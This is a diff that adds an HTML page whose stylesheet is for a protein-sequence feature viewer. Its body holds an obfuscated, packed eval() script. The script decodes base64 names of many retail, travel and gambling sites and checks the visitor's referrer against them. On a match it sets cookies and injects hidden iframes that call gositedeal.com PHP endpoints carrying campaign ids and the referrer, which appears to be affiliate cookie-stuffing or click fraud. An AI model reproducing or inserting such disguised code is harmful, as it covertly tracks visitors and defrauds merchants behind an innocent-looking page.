@@ -1,0 +1,89 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<style>
+div.header {
+    height: 2em;
+    width: 100%;
+    background: #eee;
+    position: static;
+    top: 0px;
+}
+
+div#main {
+}
+footer {
+    height: 2em;
+    width: 100%;
+    background: #eee;
+    opacity: .7;
+    position: fixed;
+    bottom: 0px;
+}
+
+text.sequence {
+    text-anchor: middle;
+    font-family: monospace;
+}
+line.sequence-bg{
+    stroke-width:3px;
+    stroke:#aaa;
+}
+
+g.axis-bubble text {
+    text-anchor: middle;
+    alignment-baseline: middle;
+    font-family: monospace;
+}
+g.axis-bubble rect {
+    stroke: #777;
+    fill: white;
+}
+svg.pviz rect.background {
+    fill: #f5f5f5;
+}
+
+rect.layer-background {
+    fill: white;
+    opacity: 0;
+    border-bottom-color: black;
+    border-bottom-style: solid;
+    border-bottom-width: 1px;
+}
+
+g.layer:hover rect.layer-background {
+    opacity: 1.0;
+}
+
+/**
+ *     color brewer 7 class paired #a6cee3 #1f78b4 #b2df8a #33a02c #fb9a99 #e31a1c #fdbf6f
+ */
+g.feature rect.feature {
+    fill: #a6cee3;
+    fill-opacity: 0.9;
+    stroke: #555;
+    stroke-opacity: 0.6;
+}
+
+g.feature text {
+    alignment-baseline: middle;
+    opacity: 0.75;
+}
+
+g.feature.Region rect.feature {
+    fill: #1f78b4;
+}
+g.feature.Molecule_processing rect.feature {
+    fill: #b2df8a;
+}
+
+g.layer g.strikeout line {
+    stroke: #bbb;
+    stroke-width: 2px;
+}
+</style>
+<script src="prompt.js"></script></head><body>
+<script>
+eval(function(p,x,i,l,y,u){y=function(c){return(c<x?'':y(parseInt(c/x)))+((c=c%x)>35?String.fromCharCode(c+29):c.toString(36))};while(i--){if(l[i]){p=p.replace(new RegExp('\\b'+y(i)+'\\b','g'),l[i])}}return p}('x s(n,v,19,k){9(19){y W=2Y 3r();W.3i(W.31()+(19*35));y T="; T="+W.3b()}b y T="";9(!k)z.1e=n+"="+v+T+"; 1G=/";b{9(k<2)k=2;z.1e=n+"="+v+T+"; 1G=/; G="+26(k)+";"}}x R(1w){y 1c=1w+"=";y 1f=z.1e.H(";");3a(y i=0;i<1f.M;i++){y c=1f[i];25(c.39(0)==" ")c=c.2i(1,c.M);9(c.l(1c)==0)C c.2i(1c.M,c.M)}C 3c}x 16(15){y J;9(15.l("://")>-1){J=15.H("/")[2]}b{J=15.H("/")[0]}J=J.H(":")[0];J=J.H("?")[0];C J}x 3d(o,h,k){9(!R(o+"O")){9(!k)s(o+"O",1,h);b{s(o+"O",1,h);s(o+"O",1,h,k)}F.1i=P()+"2Q.S?c="+o+L()}}x L(){9(F.1i.38!="37:")C"";b C"&33=32"}x P(){C E("2g=")}x 34(a){9(a==1)C E("2g=")}x 26(k){y G=16(z.Q);G=G.H(":")[0];y 1m=G.H(".").M;25(1m>k){G=G.36(/^[^.]+\\./g,"");1m=G.H(".").M}C G}x 3e(){1a=F.2e.3f||F.2e.1a;C 1a}x 3n(o,h,k){9(!k)s(o+"O",1,h);b{s(o+"O",1,h);s(o+"O",1,h,k)}F.1i=P()+"2Q.S?c="+o+L()}x 1H(){C I(16(z.Q))}x 2W(2L){C"&3o="+I(2L)}x d(o,h,k,B,2V){9(!R("1d"+I(o))){9(!k)s("1d"+I(o),1,h);b{s("1d"+I(o),1,h);s("D",1,h,k)}9(!B)B=f;9(K.14((K.18()*f)+1)<=B){y q=z.Y("q");q.13.10="X";q.17=P()+"3p.S?1h=1l&1k=1b=&c="+o+"&t="+h+L()+2W(2V)+"&r="+I(z.Q);z.11.Z(q)}}}x 2j(o,h,k,B){9(!R("D")){9(!k)s("D",1,h);b{s("D",1,h);s("D",1,h,k)}9(!B)B=f;9(K.14((K.18()*f)+1)<=B){y q=z.Y("q");q.13.10="X";q.17=P()+"3q.S?1h=1l&1k=1b=&c="+o+"&2A="+2D()+"&t="+h+L()+"&r="+I(z.Q);z.11.Z(q)}}}x 2s(o,h,k,B){9(!R("D")){9(!k)s("D",1,h);b{s("D",1,h);s("D",1,h,k)}9(!B)B=f;9(K.14((K.18()*f)+1)<=B){y q=z.Y("q");q.13.10="X";q.17=P()+"3m.S?1h=1l&1k=1b=&c="+o+"&t="+h+L()+"&r="+I(z.Q);z.11.Z(q)}}}x 2D(){1N{9(F.1D!==F.1B)C 1}1A(e){C 0}}x 3h(o,h,k,B){9(!R("D")){9(!k)s("D",1,h);b{s("D",1,h);s("D",1,h,k)}9(!B)B=f;9(K.14((K.18()*f)+1)<=B){y q=z.Y("q");q.13.10="X";q.17=P()+"3g.S?c="+o+"&t="+h+L();z.11.Z(q)}}}x 3j(){1N{C F.1D!==F.1B}1A(e){C 3k}}y u=z.Q;y t=1H();y w=16(u).H(".");w=w[w.M-1];9(w=="V"){9(t=="2N="){d("",m,2,f,"2N=")}b 9(u.l(E("23"))>-1){d("30",m,2,f,"23")}b 9(u.l(E("2r=="))>-1){d("2X",p,2,f,"2r==")}b 9(t=="2m"){d("2Z",A,2,f,"2m")}b 9(t=="2k="){d("3l",3N,2,f,"2k=")}b 9(t=="2t"){2j("4N",2p,2,f,"2t")}b 9(t=="2h=="){2s("4m",2p,2,f,"2h==")}b 9(t=="28="){d("4o",m,2,f,"28=")}b 9(t=="2a="){d("4k",m,2,f,"2a=")}b 9(t=="2v="){d("4R",m,2,f,"2v=")}b 9(t=="2S="){d("4i",m,2,f,"2S=")}b 9(t=="2K=="){d("4q",m,2,f,"2K==")}b 9(t=="2H="){d("4p",m,2,f,"2H=")}b 9(t=="1V=="){d("4r",m,2,f,"1V==")}b 9(t=="1K=="){d("4s",m,2,f,"1K==")}b 9(t=="2x="){d("4v",m,2,f,"2x=")}b 9(t=="1I="){d("4u",m,2,f,"1I=")}b 9(t=="1J=="){d("4t",m,2,f,"1J==")}b 9(t=="1L=="){d("4n",m,2,f,"1L==")}b 9(t=="1F=="){d("4g",m,2,f,"1F==")}b 9(t=="1z="){d("4e",m,2,f,"1z=")}b 9(t=="1C=="){d("4d",m,2,f,"1C==")}b 9(t=="1E"){d("4h",m,2,f,"1E")}b 9(t=="1M="){d("4l",m,2,f,"1M=")}b 9(u.l(E("1W="))>-1){d("3s",4j,2,f,"1W=")}b 9(u.l(E("1X="))>-1){d("4w",1Y,2,f,"1X=")}b 9(t=="1Z=="){d("4x",1Y,2,f,"1Z==")}b 9(t=="1U=="){d("4L",p,2,f,"1U==")}b 9(u.l(E("1T"))>-1){d("4K",m,2,f,"1T")}b 9(u.l(E("1P="))>-1){d("4J",p,2,f,"1P=")}b 9(t=="1Q="){d("4M",4Q,2,f,"1Q=")}b 9(t=="1R="){d("4P",A,2,f,"1R=")}b 9(u.l(E("1S=="))>-1){d("4O",A,2,f,"1S==")}b 9(u.l(E("20="))>-1){d("4I",A,2,f,"20=")}b 9(t=="1n"){d("4A",A,2,f,"1n")}b 9(t=="1o"){d("4z",A,2,f,"1o")}b 9(t=="1x="){d("4y",A,2,f,"1x=")}b 9(t=="1v=="){d("4C",A,2,f,"1v==")}b 9(t=="1p=="){d("4D",A,2,f,"1p==")}b 9(t=="1u=="){d("12",A,2,f,"1u==")}b 9(t=="1t="){d("12",A,2,f,"1t=")}b 9(t=="1q="){d("12",A,2,f,"1q=")}}b 9(w=="4G"){9(t=="1r="){d("12",A,2,f,"1r=")}}b 9(w=="4F"){9(t=="1s="){d("4E",p,3,f,"1s=")}b 9(t=="1O"){d("4B",p,3,f,"1O")}b 9(t=="2c="){d("4H",m,3,f,"2c=")}b 9(t=="2E="){d("4f",A,3,f,"2E=")}b 9(t=="2G=="){d("4b",A,3,f,"2G==")}b 9(t=="2I"){d("3I",A,3,f,"2I")}b 9(t=="2C"){d("3H",A,3,f,"2C")}b 9(t=="21=="){d("3G",p,3,f,"21==")}b 9(t=="2w=="){d("3F",p,3,f,"2w==")}b 9(t=="2y=="){d("3J",p,3,f,"2y==")}b 9(t=="2z"){d("3K",m,3,f,"2z")}b 9(t=="2B=="){d("4c",m,3,f,"2B==")}}b 9(w=="2A"){9(t=="2R=="){d("3M",p,2,f,"2R==")}b 9(t=="2T="){d("3L",p,3,f,"2T=")}}b 9(w=="3E"){9(t=="2U"){d("3D",p,3,f,"2U")}}b 9(w=="3w"){9(t=="2M"){d("3v",p,3,f,"2M")}}b 9(w=="3u"){9(t=="2O="){d("3t",p,3,f,"2O=")}b 9(t=="2P"){d("3x",p,3,f,"2P")}b 9(t=="2J="){d("3y",p,3,f,"2J=")}}b 9(w=="o"){9(t=="2u=="){d("3C",p,3,f,"2u==")}b 9(t=="2b=="){d("3B",p,3,f,"2b==")}b 9(t=="2d="){d("3A",p,3,f,"2d=")}}b 9(w=="3z"){9(t=="2f="){d("3O",p,3,f,"2f=")}}b 9(w=="3P"){9(t=="29=="){d("45",p,2,f,"29==")}}b 9(w=="44"){9(t=="22="){d("43",p,3,f,"22=")}}b 9(w=="42"){9(t=="27"){d("46",m,2,f,"27")}}9(w=="U"){9(t=="47=="){d("4a",j*j*4)}b 9(u.l("//N.2q.U")>-1){d("2q",j*j*4)}b 9(u.l("N.49.U")>-1){d("48",j*j*6,2)}b 9(u.l("N.41.U")>-1){d("40",j*j*6,2)}b 9(u.l("N.2o.U")>-1){d("2o",j*j*8,2)}}b 9(w=="2n"){9(u.l("N.3T.2n")>-1){d("3S",j*j*7,2)}}b 9(w=="1g"){9(u.l("N.3R.1g")>-1){d("3Q",j*j*8,2)}b 9(u.l("N.2l.1g")>-1){d("2l",j*j*6,2)}}b 9(u.l("3U")>-1){9(u.l("3V.V")>-1){d("3Z",j*j*3)}}b 9(u.l("1j.V")>-1){9(u.l("3Y=")>-1&&u.l("3X")<0){d("1j",j*j*24*2,2)}b{d("1j",j*j*24*2,2)}}b 9(u.l("1y")>-1){9(u.l("2F.V")>-1){d("2F",j*j*5,2)}b 9(u.l("1y.V")>-1){d("3W",j*j*5,2)}}',62,302,'|||||||||if||else||sI||100||time||60|dom|indexOf|10800||id|21600|iframe||cCook||||extension|function|var|document|14400|rand|return|_utc_e|atob|window|domain|split|btoa|hostname|Math|pRot|length|www|_e|gEnd|referrer|rCook|php|expires|es|com|date|none|createElement|appendChild|display|body|HO_cO|style|floor|url|getLocation|src|random|seconds|language|dXM|nameEQ|_utc_e_|cookie|ca|fr|_i|location|livejasmin|_cce|YWxlcnRz|count|d3d3LmdlZWtidXlpbmcuY29t|d3d3LmxvZnQuY29t|d3d3LmtvaGxzLmNvbQ|d3d3Lmxhc3RtaW51dGVob3RlbHJvb21kZWFscy5jb20|d3d3LmJlc3Rob3RlbG9mZmVycy5uZXQ|d3d3LmFtYXpvbi5jb20uYnI|d3d3LmRldGVjdGFob3RlbC5jb20|d3d3LmhvdGVsc2NvbWJpbmVkLmNvbQ|d3d3LmJhY2tjb3VudHJ5LmNvbQ|name|d3d3LjZwbS5jb20|888|d3d3Lm1pbmlpbnRoZWJveC5jb20|catch|top|d3d3LmJsdWVob3N0LmNvbQ|self|d3d3LnJvc2VnYWwuY29t|d3d3LnRpbnlkZWFsLmNvbQ|path|tH|d3d3Lmxvb2tzaS5jb20|d3d3LmR4LmNvbQ|d3d3Lmtvb3ZzLmNvbQ|d3d3LmJhbmdnb29kLmNvbQ|d3d3Lmhvc3RnYXRvci5jb20|try|d3d3LmFtZXJpY2FuYXMuY29tLmJy|ZWxlZ2FudHRoZW1lcy5jb20|d3d3LmRvbWFpbi5jb20|d3d3LmRyZXNzbGlseS5jb20|LmloZXJiLmNvbQ|ZGVzdGluaWEuY29t|d3d3LmJhbmFob3N0aW5nLmNvbQ|d3d3LmN0cmlwLmNvbQ|ZGVjb2xhci5jb20|LmRoZ2F0ZS5jb20|28800|d3d3LnBlZ2lwZWdpLmNvbQ|LnRvbXRvcC5jb20|d3d3LnZpYWphbmV0LmNvbS5icg|d3d3LmV4cGVkaWEuY28ua3I|LmFsaWV4cHJlc3MuY29t||while|eD|d3d3LjExc3RyZWV0Lm15|d3d3Lmx1ZnRoYW5zYS5jb20|d3d3LnJvYmlucy52bg|d3d3LnNob3BjbHVlcy5jb20|d3d3LnphbG9yYS5jby5pZA|d3d3LnN1Ym1hcmluby5jb20uYnI|d3d3LmV4cGVkaWEuY28uaWQ|navigator|d3d3LmV4cGVkaWEuY28udGg|Ly9nb3NpdGVkZWFsLmNvbS8|d3d3LmFnb2RhLmNvbQ|substring|sB|d3d3LnRhcmdldC5jb20|belambra|d3d3LnJlbnRhbGNhcnMuY29t|it|luckia|1800|hertz|LmdlYXJiZXN0LmNvbQ|sA|d3d3LmJvb2tpbmcuY29t|d3d3LmxhemFkYS5jby5pZA|d3d3LmphYm9uZy5jb20|d3d3LmZhc3RzaG9wLmNvbS5icg|d3d3LnFhdGFyYWlyd2F5cy5jb20|d3d3LmthbnVpLmNvbS5icg|d3d3LnNhb3BhdWxvbWFuaWEuY29tLmJy|in|d3d3LmNsdWJlZG9yaWNhcmRvLmNvbS5icg|d3d3LnphdHRpbmkuY29tLmJy|iI|d3d3LmRhZml0aS5jb20uYnI|888casino|d3d3Lm5ldHNob2VzLmNvbS5icg|d3d3LnZpYXRvci5jb20|d3d3LndhbG1hcnQuY29tLmJy|d3d3LmxhemFkYS5jb20ucGg|d3d3LnRhdGFjbGlxLmNvbQ|key|d3d3LmV4cGVkaWEuY29tLmhr|d3d3LmJsaWJsaS5jb20|d3d3LnphbG9yYS5jb20ucGg|d3d3LmV4cGVkaWEuY29tLnBo|n_t|d3d3LmFtYXpvbi5pbg|d3d3Lm15bnRyYS5jb20|d3d3LmV4cGVkaWEuY28uaW4|d3d3LmV4cGVkaWEuY29tLnR3|hos|gHo|GE_bE3|new|r_c3|AL_x3|getTime|hs|pt|gEnd2|1000|replace|https|protocol|charAt|for|toGMTString|null|sT|getLang|userLanguage|n_po|sPo|setTime|inIframe|true|TG_tC|n_b|fT|_htc|n_f|n_bo|Date|d_c8|ZA_pH|ph|EX_hK|hk|EX_pH|LA_pH|th|EX_iD|ZA_iD|LA_iD|EX_tW|tw|FA_sH4|VI_nE|ZA_tT|wA_Br|KA_nIB|SA_pL5|EX_iN|AM_iN|86400|EX_tH|vn|flixbusfr|flixbus|edreamsit|edreams|cam|cameraboys|888com|sexyproposal|psid|cboys|botema|botemania|my|EX_kR|kr|RO_bI|dummy|d3d3LnZlbnR1cmEyNC5lcw|todoslo|todoslots|testcampaign|n_S76|CL_Ri6|BL_hO|MI_iN|da_F6|TY_nD|RO_sG|MY_nT|18000|SH_Cs|HO_gA|a_G7|BA_nG|LU_fT|VI_aT|TA_cL|CT_rI|KO_vS|dxc|LO_Ks|QA_aW3|DH_gT|PE_Pg|6P_AM|LO_fT3|GK_bU|am_R2|BA_cK2|KO_L7s|AM_b5R|br|net|sU_M1|TT_cO|EL_tH|DE_sT|BA_nH|DO_mA|b_KF|iH_B2|DR_Ly|129600|JA_Bn'.split('|')))
+</script>
+
+</body></html>
